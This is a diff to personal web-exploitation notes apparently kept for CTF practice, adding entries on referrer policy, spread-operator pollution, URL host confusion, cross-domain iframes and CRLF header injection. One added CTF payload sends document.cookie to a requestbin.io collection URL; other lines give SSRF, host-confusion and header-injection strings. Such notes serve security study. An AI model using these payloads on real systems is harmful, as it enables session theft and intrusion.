@@ -1,6 +1,7 @@
 # +
 
 - [javascript](./javascript.md)
+- [wasm](./wasm.md)
 - [fuzzing](./fuzzing.md)
 - [net](./net.md)
 
@@ -76,13 +77,19 @@ if _name__ == "__main__":
     1. search?q=foo
     2. search?q=bar
     3. search?q=foo&q=bar (distinct result from previous cases)
-- cookies
-    - mitigations: http-only, secure
 - ssl strip
     - mitigations: Strict-Transport-Security (HSTS)
         - https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security
 
 - https://medium.com/@muratkaraoz/web-app-pentest-cheat-sheet-c17394af773
+
+### referrer
+
+- https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy
+    - On typo in `Referrer-Policy: ...`, set to `unsafe-url`
+        - [CTFtime\.org / justCTF \(\*\) 2020 / Computeration / Writeup](https://ctftime.org/writeup/25868)
+
+- https://developer.mozilla.org/en-US/docs/Web/Security/Referer_header:_privacy_and_security_concerns
 
 # prototype pollution
 
@@ -179,6 +186,17 @@ RegExp.prototype.test = new Proxy(RegExp.prototype.test, {
         - ~/share/ctf/seccon2020/milk-solver.js
 - [Multiple vulnerabilities that can result in RCE · Issue \#1122 · Codiad/Codiad · GitHub](https://github.com/Codiad/Codiad/issues/1122)
 
+### spread operator pollution
+
+- e.g. skip one endpoint's check by using another endpoint without that check, using former endpoint's properties
+    - [CTFtime\.org / DiceCTF 2021 / Web Utils / Writeup](https://ctftime.org/writeup/25986)
+    ```javascript
+    // addData: ({ uid, data, type })
+    database.addData({ type: 'link', ...req.body, uid });
+    // payload
+    {"data": "javascript: fetch(`https://requestbin.io/qykha7qy?data=${encodeURIComponent(document.cookie)}`)", "type": "link"}
+    ```
+
 # command injection
 
 - URL parameter
@@ -254,6 +272,7 @@ RegExp.prototype.test = new Proxy(RegExp.prototype.test, {
 curl -v 'https://let-me-see.pwn.institute/' -G --data-urlencode 'url=http://127.0.0.1/?url=http://daffy-malleable-tote.glitch.me/go'
 ```
 - https://glitch.com
+    - https://glitch.com/edit/#!/remix/hello-express
     ```javascript
     const express = require("express");
     const app = express();
@@ -285,6 +304,9 @@ curl -v 'https://let-me-see.pwn.institute/' -G --data-urlencode 'url=http://127.
 - substring: ctf_host.com.127.0.0.1.attacker_domain.com
 - lookup: ctf_host.com.attacker_domain.com resolves to 127.0.0.1
 - request: https://ctf_host.com@127.0.0.1/foo
+- host confusion
+    - http://example.com:80#@ctf.ekoparty.org/
+    - [PHP :: Sec Bug \#73192 :: parse\_url return wrong hostname](https://bugs.php.net/bug.php?id=73192)
 
 ### DNS Rebind
 
@@ -354,6 +376,25 @@ sys.stdout.buffer.write(bytes(str(hex(len(o)-7))[2:], "ascii") + b"\r\n" + o)' ~
     - [GitHub \- galdeleon/yolovault: writeup for yolovault challenge \- 33c3 ctf](https://github.com/galdeleon/yolovault)
         - uses timeouts to wait for loaded iframe content
         - ~/code/snippets/ctf/web/yolovault/
+    - cross-domain, both domains controlled: use `postMessage()`
+        - https://stackoverflow.com/questions/9393532/cross-domain-iframe-issue
+        ```javascript
+        // framed.html
+        window.onmessage = function(event) {
+            event.source.postMessage(document.body.innerHTML, event.origin);
+        };
+
+        // Main page:
+        window.onmessage = function(event) {
+            alert(event.data);
+        };
+
+        // Trigger:
+        // <iframe id="myframe" src="framed.htm"></iframe>
+        document.getElementById('myframe').contentWindow.postMessage('','*');
+        ```
+    - X-Frame-Options
+        - https://stackoverflow.com/questions/46998540/how-to-set-x-frame-options-in-express-js-node-js
 
 DOM-Based:
 
@@ -416,6 +457,7 @@ xhr.send();
 ```
 
 - https://github.com/snovvcrash/cheatsheets#xss
+- ~/code/guides/ctf/WebBook/HTTP/XSS学习.md
 
 Mitigations:
 
@@ -429,7 +471,6 @@ Mitigations:
             <?php header("Set-Cookie: SESSIONID=ImAhttpOnlyCookie; path=/; httponly"); ?>
             <a href='phpinfo.php'>aa</a>
             ```
-            ~/code/guides/ctf/WebBook/HTTP/XSS学习.md
 - [Content Security Policy \(CSP\) \- HTTP | MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
     - https://csp-evaluator.withgoogle.com
     - bypass: using valid elements/attributes
@@ -778,6 +819,9 @@ nginx:
     - https://owasp.org/www-community/attacks/Cache_Poisoning
 - https://haboob.sa/ctf/nullcon-2019/babyJs.html
     - [Breakout in v3\.6\.9 · Issue \#186 · patriksimek/vm2 · GitHub](https://github.com/patriksimek/vm2/issues/186)
+- redirect given appended string
+    - `foo.com?var=`
+    - `foo.com\r\nFoo-Header:`
 - URL path truncation - use `/..` padding
     - `python -c 'print("http://foo?page=a/../admin.html"+"/."*2027)'`
     - http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20PHP%20path%20truncation.html
